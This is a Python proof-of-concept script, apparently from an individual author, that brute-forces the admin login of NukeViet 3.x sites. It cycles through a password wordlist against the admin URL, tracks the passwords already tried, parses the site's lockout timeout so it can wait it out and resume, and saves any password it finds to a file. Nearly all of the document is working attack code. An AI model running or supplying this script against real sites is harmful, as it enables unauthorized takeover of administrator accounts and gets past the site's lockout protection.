#POC BY VHAE04 BRUTE FORCE PW - VER NUKEVIET 3.X
#CHANGE URL[page admin] ,USER , AND FIlE LISTWPW.text
import requests
import time
count=0
def start(count):
	#---------------------VAR CAN CHANGE-----------------------------------------------
	user='admin'                                                            #change user / default is admin
	timewait=0.3                                                            #time delay post request
	url = 'https://testnukevhae.000webhostapp.com/zxc/nukeviet/admin/'      #url page login
	#---------------------VAR CAN CHANGE-----------------------------------------------
	
	all_list_try=[]
	file_pw = open("listpw.txt","r",encoding="utf8")
	file_pw_try = open("list_pass_trylogin.txt", "r",encoding="utf8")

	pw_raw = file_pw.read()
	pw_try_list = file_pw_try.read()
	x = pw_raw.split()
	y = pw_try_list.split()

	cookie_sess=(requests.post(url).headers["Set-Cookie"].split("=")[0])

	headerss={
	"Referer": url
	}
	cookies={cookie_sess:"VHAE_HACK"}

	print("WE NEED LOGIN WITH " + str(len(pw_raw.split()) - len(y)) +" PW")

	
	for pw in range(int(len(pw_try_list)/2),len(x)):
		
		pw = x[len(y)+count]
		count=count+1

		


		ff = open("list_pass_trylogin.txt", "a",encoding="utf8")
		
		ff.write(pw)
		ff.write("\n")
			
		time.sleep(timewait)
		p = requests.post(url, data={"nv_login": user,"nv_password": pw},cookies=cookies,headers=headerss)
		if(p.text.find("1a264e") != -1):
			print("pass found ==> | "+ user +" | "+ pw + "")
			f = open("save_pw.txt", "a")
			f.write("pass found ==> | "+ user +" | "+ pw + "")
			f.close()
			break
		if(p.text.find("Copyright") == -1):
			
			timewait = int(p.text.split("var Timeout = '")[1].split("'")[0]) + 1
			
			for i in range(0,timewait):
				print("WEB HAVE BLOCK REQUEST PLS WAIT " +str(timewait-i) +" TO TRY LOGIN")
				time.sleep(1)
			start(count)
			break
			
		else:
			print("try login "+str(count)+" = | "+ user +" | "+ pw )
		
		

start(count)




